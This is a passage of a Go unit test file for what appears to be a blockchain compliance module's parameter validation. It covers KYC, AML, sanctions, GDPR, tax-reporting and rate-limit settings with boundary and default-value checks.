		"report[1].pdf",
		"report{data}.json",
	}

	for _, path := range allowedPaths {
		t.Run(path, func(t *testing.T) {
			err := ValidateFilePath(path)
			require.NoError(t, err, "Should allow path with valid special chars: %s", path)
		})
	}
}

// ============================================================================
// Comprehensive Params Combinations
// ============================================================================

func TestValidateParams_AllCombinations(t *testing.T) {
	testCases := []struct {
		name   string
		params ComplianceParams
	}{
		{
			name: "KYC only",
			params: ComplianceParams{
				KycRequired:     true,
				MinimumKycLevel: KYCLevel_KYC_LEVEL_BASIC,
				KycExpiryDays:   365,
			},
		},
		{
			name: "AML monitoring only",
			params: ComplianceParams{
				TransactionMonitoringEnabled: true,
				VelocityLimit_24H:            "1000000",
				SingleTransactionLimit:       "100000",
				StructuringThresholdCount:    10,
			},
		},
		{
			name: "Sanctions only",
			params: ComplianceParams{
				SanctionsScreeningEnabled: true,
				SanctionsLists:            []string{"OFAC"},
				ScreeningCacheHours:       24,
			},
		},
		{
			name: "GDPR only",
			params: ComplianceParams{
				GdprEnabled:        true,
				DataRetentionDays:  730,
				ProcessingPurposes: []string{"compliance"},
			},
		},
		{
			name: "Tax reporting only",
			params: ComplianceParams{
				TaxReportingEnabled: true,
				TaxJurisdictions:    []string{"US"},
				TaxYearEnd:          "12-31",
			},
		},
		{
			name: "All enabled",
			params: ComplianceParams{
				KycRequired:                  true,
				MinimumKycLevel:              KYCLevel_KYC_LEVEL_ADVANCED,
				KycExpiryDays:                365,
				TransactionMonitoringEnabled: true,
				VelocityLimit_24H:            "1000000",
				SingleTransactionLimit:       "100000",
				StructuringThresholdCount:    10,
				SanctionsScreeningEnabled:    true,
				SanctionsLists:               []string{"OFAC", "EU"},
				ScreeningCacheHours:          24,
				GdprEnabled:                  true,
				DataRetentionDays:            730,
				ProcessingPurposes:           []string{"compliance"},
				TaxReportingEnabled:          true,
				TaxJurisdictions:             []string{"US"},
				TaxYearEnd:                   "12-31",
			},
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			err := ValidateParams(tc.params)
			require.NoError(t, err)
		})
	}
}

// ============================================================================
// Rate Limiting Parameter Tests
// ============================================================================

func TestValidateParams_ValidRateLimits(t *testing.T) {
	params := ComplianceParams{
		RateLimitWindowSeconds:   3600, // 1 hour
		SanctionsScreeningLimit:  100,
		KycVerificationLimit:     50,
		AmlProfileQueryLimit:     200,
		TaxReportGenerationLimit: 10,
		DefaultQueryLimit:        1000,
	}
	err := ValidateParams(params)
	require.NoError(t, err)
}

func TestValidateParams_RateLimitWindowTooLarge(t *testing.T) {
	params := ComplianceParams{
		RateLimitWindowSeconds: 86400*7 + 1, // Exceeds 7 days
	}
	err := ValidateParams(params)
	require.Error(t, err)
	require.Contains(t, err.Error(), "rate_limit_window_seconds too large")
}

func TestValidateParams_RateLimitWindowTooSmall(t *testing.T) {
	params := ComplianceParams{
		RateLimitWindowSeconds: 59, // Less than 1 minute
	}
	err := ValidateParams(params)
	require.Error(t, err)
	require.Contains(t, err.Error(), "rate_limit_window_seconds too small")
}

func TestValidateParams_RateLimitWindowBoundaries(t *testing.T) {
	testCases := []struct {
		name    string
		seconds uint64
		valid   bool
	}{
		{"zero (disabled)", 0, true},
		{"59 seconds", 59, false},
		{"60 seconds (min)", 60, true},
		{"3600 seconds (1 hour)", 3600, true},
		{"86400 seconds (1 day)", 86400, true},
		{"604800 seconds (7 days, max)", 86400 * 7, true},
		{"604801 seconds (over max)", 86400*7 + 1, false},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			params := ComplianceParams{
				RateLimitWindowSeconds: tc.seconds,
			}
			err := ValidateParams(params)
			if tc.valid {
				require.NoError(t, err, "Expected valid for %d seconds", tc.seconds)
			} else {
				require.Error(t, err, "Expected error for %d seconds", tc.seconds)
			}
		})
	}
}

func TestValidateParams_NegativeSanctionsScreeningLimit(t *testing.T) {
	params := ComplianceParams{
		SanctionsScreeningLimit: -1,
	}
	err := ValidateParams(params)
	require.Error(t, err)
	require.Contains(t, err.Error(), "sanctions_screening_limit cannot be negative")
}

func TestValidateParams_SanctionsScreeningLimitTooLarge(t *testing.T) {
	params := ComplianceParams{
		SanctionsScreeningLimit: 10001,
	}
	err := ValidateParams(params)
	require.Error(t, err)
	require.Contains(t, err.Error(), "sanctions_screening_limit too large")
}

func TestValidateParams_NegativeKycVerificationLimit(t *testing.T) {
	params := ComplianceParams{
		KycVerificationLimit: -1,
	}
	err := ValidateParams(params)
	require.Error(t, err)
	require.Contains(t, err.Error(), "kyc_verification_limit cannot be negative")
}

func TestValidateParams_KycVerificationLimitTooLarge(t *testing.T) {
	params := ComplianceParams{
		KycVerificationLimit: 10001,
	}
	err := ValidateParams(params)
	require.Error(t, err)
	require.Contains(t, err.Error(), "kyc_verification_limit too large")
}

func TestValidateParams_NegativeAmlProfileQueryLimit(t *testing.T) {
	params := ComplianceParams{
		AmlProfileQueryLimit: -1,
	}
	err := ValidateParams(params)
	require.Error(t, err)
	require.Contains(t, err.Error(), "aml_profile_query_limit cannot be negative")
}

func TestValidateParams_AmlProfileQueryLimitTooLarge(t *testing.T) {
	params := ComplianceParams{
		AmlProfileQueryLimit: 10001,
	}
	err := ValidateParams(params)
	require.Error(t, err)
	require.Contains(t, err.Error(), "aml_profile_query_limit too large")
}

func TestValidateParams_NegativeTaxReportGenerationLimit(t *testing.T) {
	params := ComplianceParams{
		TaxReportGenerationLimit: -1,
	}
	err := ValidateParams(params)
	require.Error(t, err)
	require.Contains(t, err.Error(), "tax_report_generation_limit cannot be negative")
}

func TestValidateParams_TaxReportGenerationLimitTooLarge(t *testing.T) {
	params := ComplianceParams{
		TaxReportGenerationLimit: 1001,
	}
	err := ValidateParams(params)
	require.Error(t, err)
	require.Contains(t, err.Error(), "tax_report_generation_limit too large")
}

func TestValidateParams_NegativeDefaultQueryLimit(t *testing.T) {
	params := ComplianceParams{
		DefaultQueryLimit: -1,
	}
	err := ValidateParams(params)
	require.Error(t, err)
	require.Contains(t, err.Error(), "default_query_limit cannot be negative")
}

func TestValidateParams_DefaultQueryLimitTooLarge(t *testing.T) {
	params := ComplianceParams{
		DefaultQueryLimit: 10001,
	}
	err := ValidateParams(params)
	require.Error(t, err)
	require.Contains(t, err.Error(), "default_query_limit too large")
}

func TestValidateParams_RateLimitBoundaryValues(t *testing.T) {
	testCases := []struct {
		name   string
		params ComplianceParams
		valid  bool
	}{
		{
			name: "all at max allowed",
			params: ComplianceParams{
				RateLimitWindowSeconds:   86400 * 7, // Max: 7 days
				SanctionsScreeningLimit:  10000,     // Max
				KycVerificationLimit:     10000,     // Max
				AmlProfileQueryLimit:     10000,     // Max
				TaxReportGenerationLimit: 1000,      // Max (lower due to expense)
				DefaultQueryLimit:        10000,     // Max
			},
			valid: true,
		},
		{
			name: "all at zero (disabled)",
			params: ComplianceParams{
				RateLimitWindowSeconds:   0,
				SanctionsScreeningLimit:  0,
				KycVerificationLimit:     0,
				AmlProfileQueryLimit:     0,
				TaxReportGenerationLimit: 0,
				DefaultQueryLimit:        0,
			},
			valid: true,
		},
		{
			name: "window at min",
			params: ComplianceParams{
				RateLimitWindowSeconds: 60, // Min: 1 minute
			},
			valid: true,
		},
		{
			name: "sanctions screening at max",
			params: ComplianceParams{
				SanctionsScreeningLimit: 10000,
			},
			valid: true,
		},
		{
			name: "tax report generation at max",
			params: ComplianceParams{
				TaxReportGenerationLimit: 1000,
			},
			valid: true,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			err := ValidateParams(tc.params)
			if tc.valid {
				require.NoError(t, err)
			} else {
				require.Error(t, err)
			}
		})
	}
}

func TestValidateParams_RateLimitZeroValues(t *testing.T) {
	// Zero values should be allowed (means rate limiting disabled)
	params := ComplianceParams{
		RateLimitWindowSeconds:   0,
		SanctionsScreeningLimit:  0,
		KycVerificationLimit:     0,
		AmlProfileQueryLimit:     0,
		TaxReportGenerationLimit: 0,
		DefaultQueryLimit:        0,
	}
	err := ValidateParams(params)
	require.NoError(t, err)
}

func TestValidateParams_RateLimitRealisticValues(t *testing.T) {
	// Test realistic production values
	testCases := []struct {
		name   string
		params ComplianceParams
	}{
		{
			name: "conservative limits",
			params: ComplianceParams{
				RateLimitWindowSeconds:   3600, // 1 hour
				SanctionsScreeningLimit:  10,   // 10/hour
				KycVerificationLimit:     5,    // 5/hour
				AmlProfileQueryLimit:     20,   // 20/hour
				TaxReportGenerationLimit: 2,    // 2/hour
				DefaultQueryLimit:        100,  // 100/hour
			},
		},
		{
			name: "moderate limits",
			params: ComplianceParams{
				RateLimitWindowSeconds:   3600, // 1 hour
				SanctionsScreeningLimit:  100,  // 100/hour
				KycVerificationLimit:     50,   // 50/hour
				AmlProfileQueryLimit:     200,  // 200/hour
				TaxReportGenerationLimit: 10,   // 10/hour
				DefaultQueryLimit:        1000, // 1000/hour
			},
		},
		{
			name: "generous limits",
			params: ComplianceParams{
				RateLimitWindowSeconds:   86400, // 24 hours
				SanctionsScreeningLimit:  1000,  // 1000/day
				KycVerificationLimit:     500,   // 500/day
				AmlProfileQueryLimit:     2000,  // 2000/day
				TaxReportGenerationLimit: 100,   // 100/day
				DefaultQueryLimit:        5000,  // 5000/day
			},
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			err := ValidateParams(tc.params)
			require.NoError(t, err)
		})
	}
}

func TestValidateParams_CompleteWithRateLimits(t *testing.T) {
	// Test that all parameters including rate limits work together
	params := ComplianceParams{
		// KYC parameters
		KycRequired:     true,
		MinimumKycLevel: KYCLevel_KYC_LEVEL_ADVANCED,
		KycExpiryDays:   365,
		ApprovedKycProviders: []string{
			"cosmos1validprovider1xxxxxxxxxxxxxxxxxxx",
			"cosmos1validprovider2xxxxxxxxxxxxxxxxxxx",
		},
		BlockedJurisdictions: []string{"KP", "IR"},

		// Transaction monitoring
		TransactionMonitoringEnabled: true,
		VelocityLimit_24H:            "1000000",
		SingleTransactionLimit:       "100000",
		StructuringThresholdCount:    10,

		// Sanctions screening
		SanctionsScreeningEnabled: true,
		SanctionsLists:            []string{"OFAC", "EU", "UN"},
		ScreeningCacheHours:       24,

		// GDPR
		GdprEnabled:        true,
		DataRetentionDays:  730,
		ProcessingPurposes: []string{"compliance", "analytics"},

		// Tax reporting
		TaxReportingEnabled: true,
		TaxJurisdictions:    []string{"US", "EU", "UK"},
		TaxYearEnd:          "12-31",

		// Rate limiting
		RateLimitWindowSeconds:   3600,
		SanctionsScreeningLimit:  100,
		KycVerificationLimit:     50,
		AmlProfileQueryLimit:     200,
		TaxReportGenerationLimit: 10,
		DefaultQueryLimit:        1000,
	}

	err := ValidateParams(params)
	require.NoError(t, err)
}

func TestDefaultParams_IncludesRateLimits(t *testing.T) {
	params := DefaultParams()

	// Verify rate limit defaults are set
	require.Equal(t, uint64(3600), params.RateLimitWindowSeconds)
	require.Equal(t, int64(100), params.SanctionsScreeningLimit)
	require.Equal(t, int64(50), params.KycVerificationLimit)
	require.Equal(t, int64(200), params.AmlProfileQueryLimit)
	require.Equal(t, int64(10), params.TaxReportGenerationLimit)
	require.Equal(t, int64(1000), params.DefaultQueryLimit)

	// Verify defaults are valid
	err := ValidateParams(params)
	require.NoError(t, err)
}
